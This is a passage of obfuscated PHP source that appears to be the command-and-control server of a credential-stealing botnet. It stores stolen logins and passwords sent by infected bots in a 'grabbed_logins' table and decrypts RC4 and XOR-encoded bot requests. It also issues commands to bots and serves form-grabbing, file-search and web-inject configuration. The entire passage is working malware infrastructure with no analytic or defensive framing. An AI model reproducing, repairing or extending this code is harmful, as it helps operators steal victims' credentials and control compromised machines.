        $login_type = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($login_type);
        $login_host = _obfuscated_0D08300701270F0205383C2F0C32021B01355B3C2C3622_($login_host);
        $login_host = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($login_host);
        $login_username = _obfuscated_0D042F1F10363535032E052907353F0C111E5B5C283F32_($login_username);
        $login_username = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($login_username);
        $login_password = _obfuscated_0D042F1F10363535032E052907353F0C111E5B5C283F32_($login_password);
        $login_password = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($login_password);
        return parent::Query("INSERT INTO " . $this->pdbname . ".grabbed_logins VALUES(NULL, UNHEX('" . $bot_guid . "'), '" . $bot_id . "', '" . $_obfuscated_0D0F23151705110D041637275C181B1C1A1B2D0A0F2701_ . "', '" . $login_type . "', '" . $login_host . "', '" . $login_port . "', '" . $login_username . "', '" . $login_password . "', UNIX_TIMESTAMP(NOW()))");
    }
    public function LoginExists($login_host = "", $login_username = "", $login_password = "")
    {
        $_obfuscated_0D0F23151705110D041637275C181B1C1A1B2D0A0F2701_ = $this->HashLogin($login_host, $login_username, $login_password);
        $_obfuscated_0D26403D2C075B0B04032D27141C1A2A0C041F3B101632_ = parent::Query("SELECT id FROM " . $this->pdbname . ".grabbed_logins WHERE info_hash = '" . $_obfuscated_0D0F23151705110D041637275C181B1C1A1B2D0A0F2701_ . "' LIMIT 1");
        if ($_obfuscated_0D26403D2C075B0B04032D27141C1A2A0C041F3B101632_ && 0 < @mysql_num_rows($_obfuscated_0D26403D2C075B0B04032D27141C1A2A0C041F3B101632_)) {
            return true;
        }
        return false;
    }
    public function ParseAndAddGrabbedLogins($bot_guid_bin = "", $bot_record_id = 0)
    {
        global $g_szPost_LoginCountName;
        global $g_szPost_LoginInfoName;
        global $g_dwPost_LoginCountXorKey;
        global $g_dwPost_LoginCountSubstrValue;
        if (!isset($_POST[(string) $g_szPost_LoginCountName])) {
            return 0;
        }
        $_obfuscated_0D12040118041C15373917065C0416161E0E11213D3822_ = 0;
        $_obfuscated_0D26392832212B400E2A090F3F092411403539323B1811_ = $_POST[(string) $g_szPost_LoginCountName];
        $_obfuscated_0D400B3901051C17352B0A37330B302B350927140C2411_ = (double) substr($_obfuscated_0D26392832212B400E2A090F3F092411403539323B1811_, $g_dwPost_LoginCountSubstrValue, strlen($_obfuscated_0D26392832212B400E2A090F3F092411403539323B1811_) - $g_dwPost_LoginCountSubstrValue);
        $_obfuscated_0D400B3901051C17352B0A37330B302B350927140C2411_ = (double) ($_obfuscated_0D400B3901051C17352B0A37330B302B350927140C2411_ ^ $g_dwPost_LoginCountXorKey);
        if (0 < $_obfuscated_0D400B3901051C17352B0A37330B302B350927140C2411_ && $_obfuscated_0D400B3901051C17352B0A37330B302B350927140C2411_ < 1024) {
            for ($i = 0; $i < $_obfuscated_0D400B3901051C17352B0A37330B302B350927140C2411_; $i++) {
                $_obfuscated_0D2B122530020D2D1A5C030B27093F293E223B01223001_ = (string) $g_szPost_LoginInfoName . $i;
                if (isset($_POST[$_obfuscated_0D2B122530020D2D1A5C030B27093F293E223B01223001_]) && 8 < strlen($_POST[$_obfuscated_0D2B122530020D2D1A5C030B27093F293E223B01223001_])) {
                    global $g_btPost_LoginXorKeys;
                    $_obfuscated_0D1A03233B1D10181E0E1C0D1E3F0A26215C2F363F0432_ = $g_btPost_LoginXorKeys;
                    $_obfuscated_0D01193B3C135B041D220D38281835253D3E1440333801_ = _obfuscated_0D191C1C313423341903060A182E03320F3E2D063C0532_($_POST[$_obfuscated_0D2B122530020D2D1A5C030B27093F293E223B01223001_]);
                    $_obfuscated_0D01193B3C135B041D220D38281835253D3E1440333801_ = _obfuscated_0D16390D053330180D2E2B1117353B1E1C331E5B0F1532_($_obfuscated_0D01193B3C135B041D220D38281835253D3E1440333801_, $_obfuscated_0D1A03233B1D10181E0E1C0D1E3F0A26215C2F363F0432_);
                    $_obfuscated_0D2E2F1E251402300F173B29363F340928213C2F033F22_ = 0;
                    $_obfuscated_0D1E1D02112621330C311C23080B1612195C1F3C313032_ = "";
                    $_obfuscated_0D0D1B1F3B0422125B03121D3D3934302A122439061411_ = "";
                    $_obfuscated_0D5C02131F101510070E211F133E1608340E313C283C32_ = 0;
                    $_obfuscated_0D3D3D10400E0E130C371A3825282B1C0A285C27100411_ = "";
                    $_obfuscated_0D402C0D163B07093C0911050A072F5B0D141705324022_ = "";
                    $_obfuscated_0D090A0106342335262E1628393B0124211417022F3732_ = "|";
                    $_obfuscated_0D34171833131D04132F2D0F0D08173608232506102422_ = NULL;
                    if (substr_count($_obfuscated_0D01193B3C135B041D220D38281835253D3E1440333801_, "|") < 3) {
                        $_obfuscated_0D090A0106342335262E1628393B0124211417022F3732_ = "//";
                        $_obfuscated_0D01193B3C135B041D220D38281835253D3E1440333801_ = substr($_obfuscated_0D01193B3C135B041D220D38281835253D3E1440333801_, 0, strlen($_obfuscated_0D01193B3C135B041D220D38281835253D3E1440333801_) - 1);
                    }
                    $_obfuscated_0D34171833131D04132F2D0F0D08173608232506102422_ = explode($_obfuscated_0D090A0106342335262E1628393B0124211417022F3732_, $_obfuscated_0D01193B3C135B041D220D38281835253D3E1440333801_);
                    if ($_obfuscated_0D34171833131D04132F2D0F0D08173608232506102422_) {
                        $_obfuscated_0D2E2F1E251402300F173B29363F340928213C2F033F22_ = _obfuscated_0D08300701270F0205383C2F0C32021B01355B3C2C3622_($_obfuscated_0D34171833131D04132F2D0F0D08173608232506102422_[0]);
                        list($_obfuscated_0D1E1D02112621330C311C23080B1612195C1F3C313032_, $_obfuscated_0D3D3D10400E0E130C371A3825282B1C0A285C27100411_, $_obfuscated_0D402C0D163B07093C0911050A072F5B0D141705324022_) = $_obfuscated_0D34171833131D04132F2D0F0D08173608232506102422_;
                        if (5 < strlen($_obfuscated_0D1E1D02112621330C311C23080B1612195C1F3C313032_) && 0 < strlen($_obfuscated_0D3D3D10400E0E130C371A3825282B1C0A285C27100411_)) {
                            $_obfuscated_0D251F322D401D0D133D350B0125310A08122231242F32_ = explode(":", $_obfuscated_0D1E1D02112621330C311C23080B1612195C1F3C313032_);
                            if ($_obfuscated_0D251F322D401D0D133D350B0125310A08122231242F32_) {
                                $_obfuscated_0D251F322D401D0D133D350B0125310A08122231242F32_ = explode(":", $_obfuscated_0D1E1D02112621330C311C23080B1612195C1F3C313032_);
                                $_obfuscated_0D0D1B1F3B0422125B03121D3D3934302A122439061411_ = $_obfuscated_0D251F322D401D0D133D350B0125310A08122231242F32_[0];
                                $_obfuscated_0D5C02131F101510070E211F133E1608340E313C283C32_ = (int) intval($_obfuscated_0D251F322D401D0D133D350B0125310A08122231242F32_[1]);
                                if (0 < strlen($_obfuscated_0D0D1B1F3B0422125B03121D3D3934302A122439061411_) && strlen($_obfuscated_0D0D1B1F3B0422125B03121D3D3934302A122439061411_) < 128 && 0 < $_obfuscated_0D5C02131F101510070E211F133E1608340E313C283C32_ && $_obfuscated_0D5C02131F101510070E211F133E1608340E313C283C32_ <= 65535 && $this->LoginExists($_obfuscated_0D0D1B1F3B0422125B03121D3D3934302A122439061411_, $_obfuscated_0D3D3D10400E0E130C371A3825282B1C0A285C27100411_, $_obfuscated_0D402C0D163B07093C0911050A072F5B0D141705324022_) == false && $this->AddLogin($bot_guid_bin, $bot_record_id, $_obfuscated_0D2E2F1E251402300F173B29363F340928213C2F033F22_, $_obfuscated_0D0D1B1F3B0422125B03121D3D3934302A122439061411_, $_obfuscated_0D5C02131F101510070E211F133E1608340E313C283C32_, $_obfuscated_0D3D3D10400E0E130C371A3825282B1C0A285C27100411_, $_obfuscated_0D402C0D163B07093C0911050A072F5B0D141705324022_)) {
                                    $_obfuscated_0D12040118041C15373917065C0416161E0E11213D3822_++;
                                }
                            }
                        }
                    }
                } else {
                    if (!isset($_POST[$_obfuscated_0D2B122530020D2D1A5C030B27093F293E223B01223001_])) {
                        break;
                    }
                }
            }
        }
        return $_obfuscated_0D12040118041C15373917065C0416161E0E11213D3822_;
    }
}
class CBotCommands
{
    public function CreateUniqueCommandId()
    {
        $_obfuscated_0D391724102F1B2A164021101E163535170E5B353D3311_ = "";
        for ($i = 0; $i < 16; $i++) {
            $_obfuscated_0D391724102F1B2A164021101E163535170E5B353D3311_ .= @pack("C", @mt_rand(0, 255));
        }
        return $_obfuscated_0D391724102F1B2A164021101E163535170E5B353D3311_;
    }
    public function CreateCommandBuffer($num_commands)
    {
        $_obfuscated_0D3F290D02283D170D3B152D092708130A280C06133C22_ = @pack("v", $num_commands);
        return $_obfuscated_0D3F290D02283D170D3B152D092708130A280C06133C22_;
    }
    public function SetCommandCount($command_response_buffer, $num_commands)
    {
        if (strlen($command_response_buffer) < 2) {
            return NULL;
        }
        $_obfuscated_0D33012F211E020D290C2840213E28275C2F0A12020D32_ = $this->CreateCommandBuffer($num_commands) . @substr($command_response_buffer, 2, @strlen($command_response_buffer) - 2);
        return $_obfuscated_0D33012F211E020D290C2840213E28275C2F0A12020D32_;
    }
    public function AddCommand($command_response_buffer, $cmd_options, $cmd_id, $cmd_str, $cmd_ex_data, $botClientEx)
    {
        $_obfuscated_0D3B381221192731253B0C1F345C3D2B3212070A015B01_ = 0;
        $_obfuscated_0D2F173827223E21091333140D25162D361B141A320D22_ = 0;
        $_obfuscated_0D230C5C150508292C261F2B233F392C2C162D5C3D3611_ = false;
        if (($_obfuscated_0D3B381221192731253B0C1F345C3D2B3212070A015B01_ = @strlen($cmd_str)) < 2) {
            return NULL;
        }
        $_obfuscated_0D2B153E221D36312C0404251F03371240340704295C32_ = "";
        if (1 <= $botClientEx->Bot_Version_Major && 8 <= $botClientEx->Bot_Version_Minor && 0 <= $botClientEx->Bot_Version_Revision && 6 <= $botClientEx->Bot_Version_Build) {
            if ($cmd_ex_data != NULL) {
                $_obfuscated_0D2F173827223E21091333140D25162D361B141A320D22_ = (int) (strlen($cmd_str) + 1 + strlen($cmd_ex_data) + 1);
            } else {
                $_obfuscated_0D2F173827223E21091333140D25162D361B141A320D22_ = (int) (strlen($cmd_str) + 1);
            }
            $_obfuscated_0D0C275B190827373C0424333F392B291208281D0D2C32_ = @pack(BOT_RESPONSE_CMD_HEADERv1806, $_obfuscated_0D2F173827223E21091333140D25162D361B141A320D22_, $cmd_options, $cmd_id, $_obfuscated_0D2B153E221D36312C0404251F03371240340704295C32_);
            $_obfuscated_0D230C5C150508292C261F2B233F392C2C162D5C3D3611_ = true;
        } else {
            $_obfuscated_0D0C275B190827373C0424333F392B291208281D0D2C32_ = @pack(BOT_RESPONSE_CMD_HEADER, (int) @strlen($cmd_str) + 1, $cmd_options, $cmd_id, $_obfuscated_0D2B153E221D36312C0404251F03371240340704295C32_);
            $_obfuscated_0D230C5C150508292C261F2B233F392C2C162D5C3D3611_ = false;
        }
        $_obfuscated_0D0C275B190827373C0424333F392B291208281D0D2C32_ .= $cmd_str;
        $_obfuscated_0D0C275B190827373C0424333F392B291208281D0D2C32_ .= "";
        if ($_obfuscated_0D230C5C150508292C261F2B233F392C2C162D5C3D3611_ == true && $cmd_ex_data != NULL && 0 < strlen($cmd_ex_data)) {
            $_obfuscated_0D0C275B190827373C0424333F392B291208281D0D2C32_ .= $cmd_ex_data;
            $_obfuscated_0D0C275B190827373C0424333F392B291208281D0D2C32_ .= "";
        }
        $command_response_buffer .= $_obfuscated_0D0C275B190827373C0424333F392B291208281D0D2C32_;
        return $command_response_buffer;
    }
}
class CBotRequestPacket
{
    public function IsValidRequest($bot_request_items, &$fail_reason)
    {
        if (!isset($bot_request_items["header_size"])) {
            $fail_reason = 1;
            return false;
        }
        if (!isset($bot_request_items["request_type"])) {
            $fail_reason = 2;
            return false;
        }
        $_obfuscated_0D07022A3C27230E063D3B3912033E2C24223723090411_ = (double) ((double) $bot_request_items["bot_attributes"] + (double) $bot_request_items["bots_killed"] ^ (double) $bot_request_items["bot_os"]);
        $_obfuscated_0D10191B32332427023D1C025C01183D03012E363C1722_ = (double) $bot_request_items["header_size"];
        $_obfuscated_0D39091E25263404140F151E0B3E012B390C3023190611_ = (int) $bot_request_items["request_type"];
        if ($_obfuscated_0D10191B32332427023D1C025C01183D03012E363C1722_ != BOT_REQUEST_HEADER_SIZE && $_obfuscated_0D10191B32332427023D1C025C01183D03012E363C1722_ != BOT_REQUEST_HEADER_SIZEv15 && $_obfuscated_0D10191B32332427023D1C025C01183D03012E363C1722_ != BOT_REQUEST_HEADER_SIZEv17 && $_obfuscated_0D10191B32332427023D1C025C01183D03012E363C1722_ != BOT_REQUEST_HEADER_SIZEv1801 && $_obfuscated_0D10191B32332427023D1C025C01183D03012E363C1722_ != BOT_REQUEST_HEADER_SIZEv1802 && $_obfuscated_0D10191B32332427023D1C025C01183D03012E363C1722_ != BOT_REQUEST_HEADER_SIZEv1803 && $_obfuscated_0D10191B32332427023D1C025C01183D03012E363C1722_ != BOT_REQUEST_HEADER_SIZEv1805) {
            $fail_reason = 3;
            return false;
        }
        if (!isset($bot_request_items["magic"]) || (double) $bot_request_items["magic"] != BOT_REQUEST_HEADER_MAGIC) {
            $fail_reason = 4;
            return false;
        }
        if (!isset($bot_request_items["header_crc32"]) || (double) $bot_request_items["header_crc32"] != $_obfuscated_0D07022A3C27230E063D3B3912033E2C24223723090411_) {
            $fail_reason = 5;
            return false;
        }
        if (!($_obfuscated_0D39091E25263404140F151E0B3E012B390C3023190611_ & BOT_REQUEST_TYPE_SYSTEM_BOOT_CHECKIN) && !($_obfuscated_0D39091E25263404140F151E0B3E012B390C3023190611_ & BOT_REQUEST_TYPE_CHECK_IN) && !($_obfuscated_0D39091E25263404140F151E0B3E012B390C3023190611_ & BOT_REQUEST_TYPE_UPDATE_STATISTICS) && !($_obfuscated_0D39091E25263404140F151E0B3E012B390C3023190611_ & BOT_REQUEST_TYPE_FORMGRAB_DATA) && !($_obfuscated_0D39091E25263404140F151E0B3E012B390C3023190611_ & BOT_REQUEST_TYPE_STEALER_DATA) && !($_obfuscated_0D39091E25263404140F151E0B3E012B390C3023190611_ & BOT_REQUEST_TYPE_UPDATE_INFOBLOBS)) {
            $fail_reason = 6;
            return false;
        }
        return true;
    }
    public function DecryptClientRequest($request_data, $request_data_key, &$request_header_version)
    {
        $request_data = RC4Crypt::decrypt($request_data_key, $request_data);
        $_obfuscated_0D3B3F3D233D041E252C211716151322222808365B0432_ = NULL;
        $_obfuscated_0D3C2E3B06321B5B3424330B1B221C340740191E232122_ = unpack(BOT_REQUEST_HEADER_SIZE_INFO, $request_data);
        if (isset($_obfuscated_0D3C2E3B06321B5B3424330B1B221C340740191E232122_["header_size"])) {
            $_obfuscated_0D10191B32332427023D1C025C01183D03012E363C1722_ = (double) $_obfuscated_0D3C2E3B06321B5B3424330B1B221C340740191E232122_["header_size"];
            if ($_obfuscated_0D10191B32332427023D1C025C01183D03012E363C1722_ == BOT_REQUEST_HEADER_SIZE) {
                $request_header_version = 12500;
                $_obfuscated_0D3B3F3D233D041E252C211716151322222808365B0432_ = unpack(BOT_REQUEST_HEADER, $request_data);
            } else {
                if ($_obfuscated_0D10191B32332427023D1C025C01183D03012E363C1722_ == BOT_REQUEST_HEADER_SIZEv15) {
                    $request_header_version = 1500;
                    $_obfuscated_0D3B3F3D233D041E252C211716151322222808365B0432_ = unpack(BOT_REQUEST_HEADERv15, $request_data);
                } else {
                    if ($_obfuscated_0D10191B32332427023D1C025C01183D03012E363C1722_ == BOT_REQUEST_HEADER_SIZEv17) {
                        $request_header_version = 1700;
                        $_obfuscated_0D3B3F3D233D041E252C211716151322222808365B0432_ = unpack(BOT_REQUEST_HEADERv17, $request_data);
                    } else {
                        if ($_obfuscated_0D10191B32332427023D1C025C01183D03012E363C1722_ == BOT_REQUEST_HEADER_SIZEv1801) {
                            $request_header_version = 1801;
                            $_obfuscated_0D3B3F3D233D041E252C211716151322222808365B0432_ = unpack(BOT_REQUEST_HEADERv1801, $request_data);
                        } else {
                            if ($_obfuscated_0D10191B32332427023D1C025C01183D03012E363C1722_ == BOT_REQUEST_HEADER_SIZEv1802) {
                                $request_header_version = 1802;
                                $_obfuscated_0D3B3F3D233D041E252C211716151322222808365B0432_ = unpack(BOT_REQUEST_HEADERv1802, $request_data);
                            } else {
                                if ($_obfuscated_0D10191B32332427023D1C025C01183D03012E363C1722_ == BOT_REQUEST_HEADER_SIZEv1803) {
                                    $request_header_version = 1803;
                                    $_obfuscated_0D3B3F3D233D041E252C211716151322222808365B0432_ = unpack(BOT_REQUEST_HEADERv1803, $request_data);
                                } else {
                                    $request_header_version = 1805;
                                    $_obfuscated_0D3B3F3D233D041E252C211716151322222808365B0432_ = unpack(BOT_REQUEST_HEADERv1805, $request_data);
                                }
                            }
                        }
                    }
                }
            }
        }
        return $_obfuscated_0D3B3F3D233D041E252C211716151322222808365B0432_;
    }
}
function _obfuscated_0D3B281E0619300C181E1F3122030C2622180E3C2D1601_($szRawData)
{
    if (strlen($_obfuscated_0D04020A102A0812223B322730390E0F5C2B2C2D2C2801_) == 0) {
        return NULL;
    }
    $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_ = base64_decode($szRawData);
    $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_ = str_replace("=", ">", $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_);
    $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_ = str_replace("+", "<", $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_);
    $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_ = str_replace("/", "|", $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_);
    $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_ = str_replace("\r", "[", $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_);
    $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_ = str_replace("\n", "]", $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_);
    $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_ = urlencode($szRawData);
    return $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_;
}
function _obfuscated_0D313B05283C130A051B2A311D363D19323B163E1F1132_($szBaseUrlEncodedText)
{
    if (strlen($szBaseUrlEncodedText) == 0) {
        return NULL;
    }
    $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_ = urldecode($szBaseUrlEncodedText);
    $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_ = str_replace(">", "=", $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_);
    $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_ = str_replace("<", "+", $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_);
    $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_ = str_replace("|", "/", $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_);
    $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_ = str_replace("[", "\r", $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_);
    $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_ = str_replace("]", "\n", $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_);
    $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_ = base64_decode($_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_);
    return $_obfuscated_0D04063F14240439141339345B2C3F31091217093E0811_;
}
function _obfuscated_0D37271A1212130E3F011E37122E110D072F020B2C0911_()
{
    if (isset($_POST[BOT_REQUEST_POST_VAR_CRYPTKEY]) && isset($_POST[BOT_REQUEST_POST_VAR_HEADER])) {
        return 0;
    }
    foreach ($_POST as $_obfuscated_0D0A09140A2D252107182D230A0A171F371236092E1A32_ => $_obfuscated_0D29243F2F34381A293E130B3D162E071D1C2D051C1E22_) {
        if (is_numeric($_obfuscated_0D29243F2F34381A293E130B3D162E071D1C2D051C1E22_) && strlen($_obfuscated_0D29243F2F34381A293E130B3D162E071D1C2D051C1E22_) < 11) {
            return (int) $_obfuscated_0D29243F2F34381A293E130B3D162E071D1C2D051C1E22_;
        }
    }
    return 0;
}
function _obfuscated_0D290E280D271C0A1D1B211A27232E27343E192D1B0501_($iCurrentSeed)
{
    $_obfuscated_0D2F2A14243D3B0C28090827340818042C13182C2D3911_ = (int) $iCurrentSeed % 6 + 4;
    $_obfuscated_0D2C2A0C1D0B01092D2C1D2F152B243128310905153301_ = "";
    for ($i = 0; $i < $_obfuscated_0D2F2A14243D3B0C28090827340818042C13182C2D3911_; $i++) {
        $_obfuscated_0D31262D0F3F073F072B5B065B0C21310E0B2521323801_ = $iCurrentSeed * ($i + 1) % 6000 % 26;
        $_obfuscated_0D2C2A0C1D0B01092D2C1D2F152B243128310905153301_ .= strtolower(@chr((int) $_obfuscated_0D31262D0F3F073F072B5B065B0C21310E0B2521323801_ + 97));
    }
    return $_obfuscated_0D2C2A0C1D0B01092D2C1D2F152B243128310905153301_;
}
function _obfuscated_0D0124241A212F141D3006082423275B2E0A5C08013901_()
{
    $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_ = "";
    $_obfuscated_0D0C0C3F0A3D102E3810101F3E10122D362E1039192801_ = "dns.dat";
    if (@file_exists($_obfuscated_0D0C0C3F0A3D102E3810101F3E10122D362E1039192801_)) {
        $_obfuscated_0D0110110E16375B3E2B2711042A220A28352616050A32_ = @fopen($_obfuscated_0D0C0C3F0A3D102E3810101F3E10122D362E1039192801_, "r");
        if ($_obfuscated_0D0110110E16375B3E2B2711042A220A28352616050A32_) {
            $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_ = @fread($_obfuscated_0D0110110E16375B3E2B2711042A220A28352616050A32_, @filesize($_obfuscated_0D0C0C3F0A3D102E3810101F3E10122D362E1039192801_));
            @fclose($_obfuscated_0D0110110E16375B3E2B2711042A220A28352616050A32_);
            if (5 < @strlen($_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_)) {
                return $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_;
            }
            $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_ = "clr 127.0.0.1";
        }
    }
    return "";
}
function _obfuscated_0D090502080B2D0E061301121E141926063D382A151911_()
{
    global $main_sql_link;
    $_obfuscated_0D3B2722331B5C182C3F2C2319302E32212F0D04021622_ = new CFormGrab();
    $_obfuscated_0D3B2722331B5C182C3F2C2319302E32212F0D04021622_->SetInternalLink($main_sql_link);
    $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_ = $_obfuscated_0D3B2722331B5C182C3F2C2319302E32212F0D04021622_->GetGrabFiltersAsBlob();
    if (!$_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_ || @strlen($_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_) < 4) {
        $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_ = "clr";
        return $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_;
    }
    return $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_;
}
function _obfuscated_0D2E070C1B40170F1E07401F1D401A032C340B1C211B22_()
{
    $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_ = "";
    $_obfuscated_0D35295C071D0B32283626150D5B315B332B3B0B080D22_ = "filesearch.dat";
    if (@file_exists($_obfuscated_0D35295C071D0B32283626150D5B315B332B3B0B080D22_)) {
        $_obfuscated_0D0932295C380F1A1E031E401109231A2A1A042F0D2322_ = @fopen($_obfuscated_0D35295C071D0B32283626150D5B315B332B3B0B080D22_, "r");
        if ($_obfuscated_0D0932295C380F1A1E031E401109231A2A1A042F0D2322_) {
            $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_ = @fread($_obfuscated_0D0932295C380F1A1E031E401109231A2A1A042F0D2322_, @filesize($_obfuscated_0D35295C071D0B32283626150D5B315B332B3B0B080D22_));
            @fclose($_obfuscated_0D0932295C380F1A1E031E401109231A2A1A042F0D2322_);
            $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_ = trim($_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_);
            $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_ .= "\n";
            $_obfuscated_0D0F3234300C02240F11043E085C1B2A16131B30375C11_ = @strlen($_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_);
            if (5 < $_obfuscated_0D0F3234300C02240F11043E085C1B2A16131B30375C11_) {
                return $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_;
            }
            $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_ = "clr";
        }
    }
    return "";
}
function _obfuscated_0D2E28340234062E5C2C0128040723271F2B2B2E102B01_()
{
    $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_ = "";
    $_obfuscated_0D0A1B040F04075C1306082C0A091B3C122F1826390B22_ = "web.dat";
    if (@file_exists($_obfuscated_0D0A1B040F04075C1306082C0A091B3C122F1826390B22_)) {
        $_obfuscated_0D40141935363F1724041F145C07032F3C2D1430382711_ = @fopen($_obfuscated_0D0A1B040F04075C1306082C0A091B3C122F1826390B22_, "r");
        if ($_obfuscated_0D40141935363F1724041F145C07032F3C2D1430382711_) {
            $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_ = @fread($_obfuscated_0D40141935363F1724041F145C07032F3C2D1430382711_, @filesize($_obfuscated_0D0A1B040F04075C1306082C0A091B3C122F1826390B22_));
            @fclose($_obfuscated_0D40141935363F1724041F145C07032F3C2D1430382711_);
            $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_ = trim(str_replace("\r", "\n", $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_));
            $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_ .= "\n\n";
            $_obfuscated_0D0F3234300C02240F11043E085C1B2A16131B30375C11_ = @strlen($_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_);
            if (5 < $_obfuscated_0D0F3234300C02240F11043E085C1B2A16131B30375C11_) {
                return $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_;
            }
            $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_ = "clr";
        }
    }
    return "";
}
function _obfuscated_0D28403B3D142D363F0B2840213636010913012B5C0E32_()
{
    $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_ = "";
    $_obfuscated_0D05212E0323282A3F321E231240401838331901272132_ = "dynconfig.dat";
    if (@file_exists($_obfuscated_0D05212E0323282A3F321E231240401838331901272132_)) {
        $_obfuscated_0D0122221B17362E0E0509290C32262C3F2A0C06181101_ = @fopen($_obfuscated_0D05212E0323282A3F321E231240401838331901272132_, "r");
        if ($_obfuscated_0D0122221B17362E0E0509290C32262C3F2A0C06181101_) {
            $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_ = @fread($_obfuscated_0D0122221B17362E0E0509290C32262C3F2A0C06181101_, @filesize($_obfuscated_0D05212E0323282A3F321E231240401838331901272132_));
            @fclose($_obfuscated_0D0122221B17362E0E0509290C32262C3F2A0C06181101_);
            if (strlen($_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_)) {
                return $_obfuscated_0D30013C053306103F07401F091B1431265B1821172911_;
            }
        }
    }
    return "";
}
function _obfuscated_0D232209031D251F0E221513190F263516272B262A0801_($botClientObject)
{
    global $g_szPost_TaskErrorReportName;
    global $g_btPost_TaskErrorXorKeys;
    if (!isset($_POST[$g_szPost_TaskErrorReportName . "1"])) {
        return false;
    }
    $i = 1;
    while ($i <= 12) {
        if (isset($_POST[$g_szPost_TaskErrorReportName . $i])) {
            global $g_btPost_TaskErrorXorKeys;
            $_obfuscated_0D2B10020B5C3804222736062221353C015B131B050B11_ = _obfuscated_0D191C1C313423341903060A182E03320F3E2D063C0532_($_POST[$g_szPost_TaskErrorReportName . $i]);
            $_obfuscated_0D1A03233B1D10181E0E1C0D1E3F0A26215C2F363F0432_ = $g_btPost_TaskErrorXorKeys;
            $_obfuscated_0D123102173E0A1D101F05313E12040A305C291A3E1101_ = _obfuscated_0D16390D053330180D2E2B1117353B1E1C331E5B0F1532_($_obfuscated_0D2B10020B5C3804222736062221353C015B131B050B11_, $_obfuscated_0D1A03233B1D10181E0E1C0D1E3F0A26215C2F363F0432_);
            if (@strstr($_obfuscated_0D123102173E0A1D101F05313E12040A305C291A3E1101_, "=")) {
                $_obfuscated_0D13142B150B1C2923320F2E13285B1B0D2E2808162E11_ = (int) intval(@substr($_obfuscated_0D123102173E0A1D101F05313E12040A305C291A3E1101_, 0, @strpos($_obfuscated_0D123102173E0A1D101F05313E12040A305C291A3E1101_, "=")));
                $_obfuscated_0D2D3C391A1D052132171F1515262A2A272C1E39361901_ = @substr(@strstr($_obfuscated_0D123102173E0A1D101F05313E12040A305C291A3E1101_, "="), 1, @strlen($_obfuscated_0D123102173E0A1D101F05313E12040A305C291A3E1101_) - 1);
                if (strlen($_obfuscated_0D2D3C391A1D052132171F1515262A2A272C1E39361901_) < 1024) {
                    global $sqlTasks;
                    $_obfuscated_0D2D3C391A1D052132171F1515262A2A272C1E39361901_ = _obfuscated_0D08300701270F0205383C2F0C32021B01355B3C2C3622_($_obfuscated_0D2D3C391A1D052132171F1515262A2A272C1E39361901_);
                    $sqlTasks->SetBotTaskCompletionRecordMessage($botClientObject->Bot_RecordID, $_obfuscated_0D13142B150B1C2923320F2E13285B1B0D2E2808162E11_, $_obfuscated_0D2D3C391A1D052132171F1515262A2A272C1E39361901_);
                }
            }
            $i++;
        } else {
            break;
        }
    }
    return true;
}
function _obfuscated_0D3E2D15141B34243702070C0C0605245C1E2B3E344032_($botClientObject)
{
    global $g_szInfoBlob_ProcessListName;
    global $g_szInfoBlob_InstalledSoftwareListName;
    global $g_szInfoBlob_AutostartListName;
    global $g_szInfoBlob_GenericListName;
